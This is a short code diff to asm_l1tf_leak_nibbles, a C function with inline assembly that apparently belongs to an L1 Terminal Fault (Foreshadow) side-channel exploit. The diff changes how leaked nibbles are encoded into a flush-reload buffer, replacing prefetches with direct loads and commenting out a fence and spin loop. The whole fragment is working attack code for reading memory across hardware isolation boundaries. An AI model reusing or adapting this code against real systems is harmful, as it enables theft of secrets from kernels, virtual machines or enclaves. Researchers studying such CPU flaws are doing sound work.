@@ -34,18 +34,18 @@ asm_l1tf_leak_nibbles(void *leak_addr, reload_buffer_t reload_buffer) {
                "and $0x0f, %%rbx\n"
                "shl $0x8, %%rax\n"
                "shl $0xc, %%rbx\n"
-               "prefetcht0 (%[nibble0], %%rbx)\n"
-               "prefetcht0 (%[nibble1], %%rax)\n"
-               "mfence\n"
-               "asm_l1tf_leak_nibbles_loop:\n"
-               "pause\n"
-               "jmp asm_l1tf_leak_nibbles_loop\n"
+               "movq (%[nibble0], %%rbx, 1), %%r8\n"
+               "movq (%[nibble1], %%rax, 1), %%r8\n"
+               /* "mfence\n" */
+               /* "asm_l1tf_leak_nibbles_loop:\n" */
+               /* "pause\n" */
+               /* "jmp asm_l1tf_leak_nibbles_loop\n" */
                ".global reload_label_nibbles\n"
                "reload_label_nibbles:"
 
                ::[leak_addr] "r"(leak_addr),
                [nibble0] "r"(reload_buffer[0]), [nibble1] "r"(reload_buffer[1])
-               : "rax", "rbx");
+               : "rax", "rbx", "r8");
 }
 
 extern uint64_t reload_label_full(void);
